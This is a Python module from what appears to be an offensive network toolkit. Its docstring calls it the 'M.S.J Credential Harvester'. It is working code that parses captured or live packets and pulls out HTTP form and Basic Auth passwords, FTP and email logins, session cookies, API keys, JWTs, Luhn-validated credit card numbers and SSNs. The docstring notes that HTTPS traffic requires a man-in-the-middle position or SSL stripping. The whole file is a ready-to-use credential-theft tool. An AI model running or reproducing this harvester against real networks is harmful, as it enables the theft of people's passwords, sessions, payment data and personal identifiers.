"""
M.S.J Credential Harvester
============================
Passively extracts credentials and sensitive data from network traffic:

  - HTTP POST forms (username/password fields)
  - HTTP Basic Authentication
  - FTP login (USER/PASS commands)
  - IMAP/POP3/SMTP login
  - Session cookies (session IDs, auth tokens)
  - API keys in query strings
  - OAuth tokens
  - JWT tokens
  - Credit card number detection (Luhn check)
  - Social security / PII patterns

Works on captured packets or live traffic. Requires MITM position
for HTTPS traffic (unless SSL stripping is active).

Creator: M.S.J
"""

import re
import json
import base64
from urllib.parse import unquote
from datetime import datetime
from typing import List, Optional, Dict, Any
from dataclasses import dataclass, field

from modules.dissect import PacketInfo


# Common credential field names in HTTP forms
PASSWORD_FIELDS = {
    'password', 'pass', 'passwd', 'pwd', 'user_password',
    'login_password', 'wp_password', 'pswd', 'passwd',
    'password_again', 'confirm_password', 'pass_confirmation',
    'key', 'secret', 'phrase', 'passphrase'
}

USERNAME_FIELDS = {
    'username', 'user', 'user_login', 'login', 'log',
    'email', 'e-mail', 'user_email', 'login_name',
    'nickname', 'user_name', 'userid', 'user_id',
    'account', 'acct', 'name'
}

# Regex patterns for credential detection
PATTERNS = {
    'basic_auth': re.compile(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', re.IGNORECASE),
    'api_key': re.compile(r'[?&](api[_.-]?key|apikey|key|token)=([^&\s]+)', re.IGNORECASE),
    'jwt': re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', re.IGNORECASE),
    'bearer': re.compile(r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)', re.IGNORECASE),
    'oauth': re.compile(r'oauth_token|access_token|refresh_token', re.IGNORECASE),
    'session_cookie': re.compile(
        r'(session_id|session|sid|PHPSESSID|JSESSIONID|ASP\.NET_SessionId|'
        r'connect\.sid|token|auth_token)=([^;\s]+)',
        re.IGNORECASE
    ),
    'cc_number': re.compile(
        r'\b(?:\d{4}[-\s]?){3}\d{4}\b'  # Basic CC pattern
    ),
    'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
    'ftp_user': re.compile(r'USER\s+(.+)', re.IGNORECASE),
    'ftp_pass': re.compile(r'PASS\s+(.+)', re.IGNORECASE),
    'email_pass': re.compile(
        r'(LOGIN|PLAIN|AUTH)\s+(?:PLAIN|LOGIN)?\s*'
        r'(?:[\s=]+)?([^\s]+)',
        re.IGNORECASE
    ),
}


@dataclass
class Credential:
    """Extracted credential entry."""
    type: str                    # 'http_form', 'basic_auth', 'ftp', 'email', 'api_key', 'jwt', 'session'
    source_ip: str = ''
    dest_ip: str = ''
    source_port: int = 0
    dest_port: int = 0
    hostname: str = ''
    uri: str = ''
    username: str = ''
    password: str = ''
    raw_data: str = ''
    timestamp: str = ''
    severity: str = 'MEDIUM'     # 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL'
    tags: list = field(default_factory=list)

    def __str__(self) -> str:
        parts = [f"[{self.timestamp}] [{self.type}]"]
        if self.hostname:
            parts.append(f"host={self.hostname}")
        if self.username:
            parts.append(f"user={self.username}")
            parts.append(f"pass={self.password}")
        else:
            parts.append(f"data={self.raw_data[:80]}")
        parts.append(f"({self.source_ip}:{self.source_port} -> {self.dest_ip}:{self.dest_port})")
        return ' '.join(parts)


class CredentialHarvester:
    """
    Extracts credentials and sensitive data from packet metadata.
    """

    def __init__(self):
        self.captured_creds: List[Credential] = []
        self._seen_creds: set = set()  # Deduplication
        self._stats = {
            'http_form': 0,
            'basic_auth': 0,
            'ftp': 0,
            'email': 0,
            'api_key': 0,
            'jwt': 0,
            'session': 0,
            'cc': 0,
            'ssn': 0,
            'total': 0
        }
        self._callback = None

    def on_credential(self, callback):
        """Set callback for each extracted credential."""
        self._callback = callback

    def analyze(self, info: PacketInfo) -> List[Credential]:
        """
        Analyze a packet's metadata for credential patterns.
        Returns list of extracted credentials.
        """
        found = []

        # --- HTTP Form Credentials ---
        if info.protocol == 'HTTP' and info.http_method == 'POST':
            creds = self._parse_http_post(info)
            found.extend(creds)

        # --- Basic Authentication ---
        if info.payload_text:
            creds = self._parse_basic_auth(info)
            found.extend(creds)

            # API keys in URLs / query strings
            creds = self._parse_api_keys(info)
            found.extend(creds)

            # JWT tokens
            creds = self._parse_jwt(info)
            found.extend(creds)


        # --- Session Cookies --- (also runs without payload_text)
        if info.http_cookie:
            creds = self._parse_session_cookies(info)
            found.extend(creds)

        # Session cookies from payload text too
        if info.payload_text:
            creds = self._parse_session_cookies(info)
            found.extend(creds)

        # --- FTP Credentials ---
        if info.dst_port == 21 or info.src_port == 21:
            creds = self._parse_ftp(info)
            found.extend(creds)

        # --- Email Protocol Credentials ---
        if info.dst_port in (25, 110, 143, 465, 587, 993, 995):
            creds = self._parse_email(info)
            found.extend(creds)

        # --- PII Detection ---
        if info.payload_text:
            creds = self._detect_pii(info)
            found.extend(creds)

        # Deduplicate and store
        for cred in found:
            dedup_key = f"{cred.type}:{cred.username}:{cred.password}:{cred.hostname}:{cred.uri}"
            if dedup_key not in self._seen_creds:
                self._seen_creds.add(dedup_key)
                cred.timestamp = info.timestamp_str or datetime.now().strftime('%H:%M:%S')
                cred.source_ip = info.src_ip
                cred.dest_ip = info.dst_ip
                cred.source_port = info.src_port
                cred.dest_port = info.dst_port
                self.captured_creds.append(cred)
                self._stats['total'] += 1
                self._stats[cred.type.lower().replace(' ', '_')] = \
                    self._stats.get(cred.type.lower().replace(' ', '_'), 0) + 1

                if self._callback:
                    self._callback(cred)

        return found

    def _parse_http_post(self, info: PacketInfo) -> List[Credential]:
        """Extract credentials from HTTP POST bodies."""
        creds = []
        body = info.http_payload or info.payload_text

        if not body:
            return creds

        # Parse URL-encoded form data
        if '=' in body and '&' in body:
            params = {}
            for pair in body.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    key = key.strip().lower()
                    value = value.strip()
                    params[key] = value

            username = ''
            password = ''

            for key, value in params.items():
                # URL decode
                value = value.replace('+', ' ')
                try:
                    value = unquote(value)
                except Exception:
                    pass

                if key in PASSWORD_FIELDS:
                    password = value
                elif key in USERNAME_FIELDS:
                    username = value

            if password:
                creds.append(Credential(
                    type='http_form',
                    hostname=info.http_host,
                    uri=info.http_uri,
                    username=username,
                    password=password,
                    raw_data=body,
                    severity='HIGH'
                ))

        # JSON body
        elif body.strip().startswith('{'):
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    username = ''
                    password = ''
                    for key, value in data.items():
                        key_lower = key.lower()
                        if isinstance(value, str):
                            if key_lower in PASSWORD_FIELDS:
                                password = value
                            elif key_lower in USERNAME_FIELDS:
                                username = value
                    if password:
                        creds.append(Credential(
                            type='http_form',
                            hostname=info.http_host,
                            uri=info.http_uri,
                            username=username,
                            password=password,
                            raw_data=body,
                            severity='HIGH'
                        ))
            except json.JSONDecodeError:
                pass

        return creds

    def _parse_basic_auth(self, info: PacketInfo) -> List[Credential]:
        """Extract HTTP Basic Authentication credentials."""
        creds = []
        match = PATTERNS['basic_auth'].search(info.payload_text)
        if match:
            try:
                decoded = base64.b64decode(match.group(1)).decode('utf-8', errors='replace')
                if ':' in decoded:
                    username, password = decoded.split(':', 1)
                    creds.append(Credential(
                        type='basic_auth',
                        hostname=info.http_host,
                        uri=info.http_uri,
                        username=username,
                        password=password,
                        raw_data=match.group(0),
                        severity='CRITICAL'
                    ))
            except Exception:
                pass
        return creds

    def _parse_api_keys(self, info: PacketInfo) -> List[Credential]:
        """Extract API keys and tokens from query strings."""
        creds = []
        for match in PATTERNS['api_key'].finditer(info.payload_text):
            creds.append(Credential(
                type='api_key',
                hostname=info.http_host,
                uri=info.http_uri,
                username=match.group(1),
                password=match.group(2),
                raw_data=match.group(0),
                severity='HIGH'
            ))
        return creds

    def _parse_jwt(self, info: PacketInfo) -> List[Credential]:
        """Extract JWT tokens."""
        creds = []
        for match in PATTERNS['jwt'].finditer(info.payload_text):
            token = match.group(0)
            # Try to decode the payload
            payload_data = ''
            try:
                parts = token.split('.')
                if len(parts) >= 2:
                    # Pad for base64
                    padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                    payload_data = base64.urlsafe_b64decode(padded).decode('utf-8', errors='replace')
            except Exception:
                pass

            creds.append(Credential(
                type='jwt',
                hostname=info.http_host,
                raw_data=token[:80],
                password=payload_data[:200],
                severity='MEDIUM'
            ))
        return creds

    def _parse_session_cookies(self, info: PacketInfo) -> List[Credential]:
        """Extract session cookies and auth tokens."""
        creds = []
        text = info.http_cookie or info.payload_text
        if not text:
            return creds

        for match in PATTERNS['session_cookie'].finditer(text):
            creds.append(Credential(
                type='session',
                hostname=info.http_host,
                username=match.group(1),
                password=match.group(2),
                raw_data=match.group(0),
                severity='MEDIUM'
            ))
        return creds

    def _parse_ftp(self, info: PacketInfo) -> List[Credential]:
        """Extract FTP credentials from control channel."""
        creds = []
        text = info.payload_text

        if not text:
            return creds

        user_match = PATTERNS['ftp_user'].search(text)
        pass_match = PATTERNS['ftp_pass'].search(text)

        if user_match:
            creds.append(Credential(
                type='ftp',
                username=user_match.group(1).strip(),
                severity='MEDIUM'
            ))
        if pass_match:
            creds.append(Credential(
                type='ftp',
                password=pass_match.group(1).strip(),
                severity='HIGH'
            ))

        return creds

    def _parse_email(self, info: PacketInfo) -> List[Credential]:
        """Extract email protocol credentials."""
        creds = []
        text = info.payload_text
        if not text:
            return creds

        # IMAP LOGIN
        imap_login = re.search(r'LOGIN\s+(\S+)\s+(\S+)', text, re.IGNORECASE)
        if imap_login:
            creds.append(Credential(
                type='email',
                username=imap_login.group(1),
                password=imap_login.group(2),
                raw_data=imap_login.group(0),
                severity='CRITICAL'
            ))

        # SMTP AUTH LOGIN
        smtp_auth = re.search(r'AUTH\s+(?:LOGIN|PLAIN)\s+(\S+)', text, re.IGNORECASE)
        if smtp_auth:
            try:
                decoded = base64.b64decode(smtp_auth.group(1)).decode('utf-8', errors='replace')
                if '\x00' in decoded:
                    parts = decoded.split('\x00')
                    if len(parts) >= 3:
                        creds.append(Credential(
                            type='email',
                            username=parts[1],
                            password=parts[2],
                            raw_data=decoded,
                            severity='CRITICAL'
                        ))
            except Exception:
                pass

        return creds

    def _detect_pii(self, info: PacketInfo) -> List[Credential]:
        """Detect credit card numbers and SSNs in payload."""
        creds = []
        text = info.payload_text
        if not text:
            return creds

        # Credit card numbers
        for match in PATTERNS['cc_number'].finditer(text):
            cc = match.group(0).replace('-', '').replace(' ', '')
            if self._luhn_check(cc):
                creds.append(Credential(
                    type='cc_number',
                    raw_data=match.group(0),
                    severity='HIGH',
                    tags=['pii', 'financial']
                ))

        # SSN
        for match in PATTERNS['ssn'].finditer(text):
            creds.append(Credential(
                type='ssn',
                raw_data=match.group(0),
                severity='HIGH',
                tags=['pii']
            ))

        return creds

    def _luhn_check(self, card_number: str) -> bool:
        """Validate credit card number using Luhn algorithm."""
        if not card_number.isdigit() or len(card_number) < 13:
            return False
        digits = [int(d) for d in card_number]
        checksum = 0
        alt = False
        for d in reversed(digits):
            if alt:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
            alt = not alt
        return checksum % 10 == 0

    def get_creds(self, filter_type: str = None) -> List[Credential]:
        """Get all captured credentials, optionally filtered by type."""
        if filter_type:
            return [c for c in self.captured_creds if c.type == filter_type]
        return self.captured_creds

    def get_stats(self) -> Dict[str, int]:
        """Get credential harvest statistics."""
        return self._stats.copy()

    def clear(self):
        """Clear all captured credentials."""
        self.captured_creds.clear()
        self._seen_creds.clear()
        self._stats = {k: 0 for k in self._stats}
